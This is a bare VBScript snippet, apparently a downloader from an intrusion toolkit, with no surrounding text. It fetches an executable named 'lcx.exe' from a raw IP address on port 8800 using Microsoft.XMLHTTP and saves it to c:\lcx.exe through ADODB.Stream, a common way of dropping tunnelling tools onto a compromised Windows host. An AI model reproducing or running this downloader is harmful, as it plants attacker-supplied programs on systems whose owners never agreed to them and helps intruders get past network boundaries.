Set xPost = createObject("Microsoft.XMLHTTP")
xPost.Open "GET","http://180.153.154.70:8800/lcx.exe",0 '
xPost.Send()
Set sGet = createObject("ADODB.Stream")
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile "c:\lcx.exe",2 '


